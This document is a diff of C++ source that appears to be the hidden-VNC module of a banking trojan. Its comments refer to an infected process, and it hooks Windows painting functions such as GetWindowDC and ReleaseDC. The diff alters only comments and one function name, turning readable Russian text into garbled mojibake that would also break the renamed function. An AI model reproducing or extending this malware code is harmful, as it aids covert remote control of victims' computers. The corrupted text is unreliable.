@@ -15,7 +15,7 @@
 #if(BO_VNC > 0)
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Drawing window.
+//Р’В Drawing window.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 //Data on the drawing window.
@@ -29,9 +29,9 @@ typedef struct
 }PAINTDATA;
 
 /*
-  Получение текущего PAINDDATA для потока.
+  РџРѕР»СѓС‡РµРЅРёРµ С‚РµРєСѓС‰РµРіРѕ PAINDDATA РґР»СЏ РїРѕС‚РѕРєР°.
 
-  Return - PAINTDATA, или NULL.
+  Return - PAINTDATA, РёР»Рё NULL.
 */
 static __inline PAINTDATA *getThreadPaintData(void)
 {
@@ -39,7 +39,7 @@ static __inline PAINTDATA *getThreadPaintData(void)
 }
 
 /*
-  Установка PAINTDATA для потока.
+  РЈСЃС‚Р°РЅРѕРІРєР° PAINTDATA РґР»СЏ РїРѕС‚РѕРєР°.
 
   IN paintData - PAINTDATA.
 */
@@ -64,11 +64,11 @@ static __inline void setThreadPaintData(const PAINTDATA *paintData)
 }
 
 /*
-  Копирование локального квадрата в удалнный квадрат, или наоборот.
+  РљРѕРїРёСЂРѕРІР°РЅРёРµ Р»РѕРєР°Р»СЊРЅРѕРіРѕ РєРІР°РґСЂР°С‚Р° РІ СѓРґР°Р»РЅРЅС‹Р№ РєРІР°РґСЂР°С‚, РёР»Рё РЅР°РѕР±РѕСЂРѕС‚.
 
   IN vncProcessData - VNCPROCESSDATA.
-  IN rect           - квадрат назначения.
-  IN toDesktop      - true - локальный в удаленный, false - удаленный в локальный.
+  IN rect           - РєРІР°РґСЂР°С‚ РЅР°Р·РЅР°С‡РµРЅРёСЏ.
+  IN toDesktop      - true - Р»РѕРєР°Р»СЊРЅС‹Р№ РІ СѓРґР°Р»РµРЅРЅС‹Р№, false - СѓРґР°Р»РµРЅРЅС‹Р№ РІ Р»РѕРєР°Р»СЊРЅС‹Р№.
 */
 static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect, bool toDesktop)
 {
@@ -89,16 +89,16 @@ static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect
 }
 
 /*
- В Drawing window.
+ Р’В Drawing window.
   
   IN vncProcessData - VNCPROCESSDATA.
-  IN window         - окно для печати.
-  IN visibleRect    - видимая область для окна.
-  IN isServer       - true - функция вызвана с сервера,
-                      false - функция вызвана с зараженного процесса.
+  IN window         - РѕРєРЅРѕ РґР»СЏ РїРµС‡Р°С‚Рё.
+  IN visibleRect    - РІРёРґРёРјР°СЏ РѕР±Р»Р°СЃС‚СЊ РґР»СЏ РѕРєРЅР°.
+  IN isServer       - true - С„СѓРЅРєС†РёСЏ РІС‹Р·РІР°РЅР° СЃ СЃРµСЂРІРµСЂР°,
+                      false - С„СѓРЅРєС†РёСЏ РІС‹Р·РІР°РЅР° СЃ Р·Р°СЂР°Р¶РµРЅРЅРѕРіРѕ РїСЂРѕС†РµСЃСЃР°.
   
-  Return            - true - окно нарисовано/пропущено,
-                      false - окно не нарисовано.
+  Return            - true - РѕРєРЅРѕ РЅР°СЂРёСЃРѕРІР°РЅРѕ/РїСЂРѕРїСѓС‰РµРЅРѕ,
+                      false - РѕРєРЅРѕ РЅРµ РЅР°СЂРёСЃРѕРІР°РЅРѕ.
 */
 bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer)
 {
@@ -329,7 +329,7 @@ HDC WINAPI VncServer::hookerGetWindowDc(HWND window)
   return CWA(user32, GetWindowDC)(window);
 }
 
-int WINAPI VncServer::hookerReleaseDс(HWND window, HDC dc)
+int WINAPI VncServer::hookerReleaseDСЃ(HWND window, HDC dc)
 {
   if(IS_VNC_PROCESS)
   {
@@ -385,16 +385,16 @@ int WINAPI VncServer::hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Overview of all windows for painting.
+//Р’В Overview of all windows for painting.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Создания процесса рисования окон.
+  РЎРѕР·РґР°РЅРёСЏ РїСЂРѕС†РµСЃСЃР° СЂРёСЃРѕРІР°РЅРёСЏ РѕРєРѕРЅ.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
 
-  Return                - true - в случаи успеха,
-                          false - в случаи ошибки.
+  Return                - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                          false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool createPaintProcess(VNCPROCESSDATA *vncProcessData)
 {
@@ -450,15 +450,15 @@ bool VncServer::startAsPaintThread(void)
 }
 
 /*
-  Выбор метода рисования окна.
+  Р’С‹Р±РѕСЂ РјРµС‚РѕРґР° СЂРёСЃРѕРІР°РЅРёСЏ РѕРєРЅР°.
 
   IN vncProcessData - VNCPROCESSDATA.
-  IN window         - окно.
-  IN ownerRect      - кординаты, видимой клиенсткой части родителя.
+  IN window         - РѕРєРЅРѕ.
+  IN ownerRect      - РєРѕСЂРґРёРЅР°С‚С‹, РІРёРґРёРјРѕР№ РєР»РёРµРЅСЃС‚РєРѕР№ С‡Р°СЃС‚Рё СЂРѕРґРёС‚РµР»СЏ.
   IN windowInfo     - WINDOWINFO.
 
-  Return            - true - рисовать детей,
-                      false - не рисовать детей.
+  Return            - true - СЂРёСЃРѕРІР°С‚СЊ РґРµС‚РµР№,
+                      false - РЅРµ СЂРёСЃРѕРІР°С‚СЊ РґРµС‚РµР№.
 */
 static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *ownerRect, const WINDOWINFO *windowInfo)
 {
@@ -528,12 +528,12 @@ typedef struct
   WINDOWINFO *windowInfo;         //Just for eknomii stack.
 }ENUMWINDOWCALLBACK;
 
-/*В В Kelbek Gui:: _enumWindows () for drawing the window.
+/*Р’В Р’В Kelbek Gui:: _enumWindows () for drawing the window.
 
-В В IN window - the window.
-В В IN param - ENUMWINDOWCALLBACK.
+Р’В Р’В IN window - the window.
+Р’В Р’В IN param - ENUMWINDOWCALLBACK.
 
-В В Return - true.*/
+Р’В Р’В Return - true.*/
 static bool enumWindowsCallback(HWND window, void *param)
 {
   ENUMWINDOWCALLBACK *ewc = (ENUMWINDOWCALLBACK *)param;
